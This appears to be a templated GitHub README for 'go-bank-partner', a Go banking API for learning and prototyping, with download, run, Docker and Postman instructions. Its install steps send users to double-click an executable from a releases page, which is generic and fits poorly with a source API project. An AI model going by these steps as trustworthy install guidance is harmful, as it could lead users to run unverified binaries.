# 🚀 go-bank-partner - Your Simple Banking API Solution

[![Download go-bank-partner](https://img.shields.io/badge/Download-go--bank--partner-brightgreen)](https://github.com/charakaviduranga/go-bank-partner/releases)

## 📖 Introduction

go-bank-partner is a complete banking API built with Go. It offers features like user authentication, account management, transaction processing, audit logging, and Docker support. This API is great for learning, preparing for interviews, or prototyping banking applications. You can easily access all functionalities with a simple setup.

## 🛠️ Features

- **User Authentication:** Securely manage user accounts and sessions.
- **Account Management:** Create, update, and delete bank accounts with ease.
- **Transaction Processing:** Handle transactions smoothly between accounts.
- **Audit Logging:** Keep track of all actions performed for security and compliance.
- **Docker Support:** Run the API in a container for easy deployment.
- **Database Migrations:** Automatically update your database structure as needed.
- **Postman Collections:** Test the API quickly with ready-to-use collections.

## 🚀 Getting Started

To get started with go-bank-partner, follow these steps to download and run the application.

### 🔗 Download & Install

1. **Visit the Releases Page**: Head over to the [Releases page](https://github.com/charakaviduranga/go-bank-partner/releases) to find the latest version.
2. **Choose Your File**: Look for the latest release suitable for your operating system. Typically, you will see files for Windows, macOS, and Linux.
3. **Download the File**: Click on the file to download it to your computer.
4. **Install the Application**: Follow the installation steps based on your operating system. If the file is an executable:
   - For Windows or macOS, double-click the downloaded file and follow the instructions.
   - For Linux, you may need to run it in the terminal.

### 🖥️ System Requirements

- **Operating System**: Windows 10 or later, macOS Catalina or later, or any modern Linux distribution.
- **Memory**: At least 4 GB of RAM.
- **Storage**: Minimum 100 MB of free disk space.
- **Docker**: If you plan to use Docker, install Docker Desktop or Docker Engine based on your OS.

## 🎉 Running the Application

Once you install go-bank-partner, you can run it using the following steps:

1. **Open Terminal or Command Prompt**: Depending on your OS, open the Terminal for macOS/Linux or the Command Prompt for Windows.
2. **Navigate to the Installation Directory**: Change to the directory where you installed go-bank-partner. Use the `cd` command:
   ```bash
   cd path_to_your_installed_folder
   ```
3. **Start the API**: Type the following command to start the application:
   ```bash
   ./go-bank-partner
   ```
   For Windows, it may look like this:
   ```cmd
   go-bank-partner.exe
   ```

4. **Access the API**: You can now access the API through your browser or a tool like Postman. The default address is `http://localhost:8080`.

## 📦 Using Docker

If you prefer to run go-bank-partner with Docker, you can follow these steps:

1. **Install Docker**: Ensure you have Docker installed on your machine.
2. **Pull the Docker Image**: Open your terminal and run:
   ```bash
   docker pull charakaviduranga/go-bank-partner
   ```
3. **Run the Container**: Start the container with:
   ```bash
   docker run -p 8080:8080 charakaviduranga/go-bank-partner
   ```

4. **Verify the API**: Access the API using `http://localhost:8080`.

## 🧪 Testing the API with Postman

Postman makes it easier to test APIs. To use Postman with go-bank-partner:

1. **Download Postman**: If you don't have it, download Postman from [Postman's official website](https://www.postman.com/downloads/).
2. **Import Postman Collection**: The release includes a Postman collection file. Import that file into Postman to start testing endpoints.
3. **Explore Endpoints**: Test user authentication, create accounts, and execute transactions using the provided collection.

## 🔍 How to Get Help

If you encounter any issues while using go-bank-partner:

- **Check the Documentation**: Additional documentation is available on GitHub.
- **Open an Issue**: You can report problems or ask questions on the GitHub Issues page.
- **Community Support**: Join the discussion in the community forum linked in the repository for peer support.

## 🛠️ Future Improvements

We aim to enhance go-bank-partner continuously. Stay tuned for more features and updates! If you have ideas or suggestions, feel free to share on the GitHub Issues page.

## ✏️ License

go-bank-partner is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.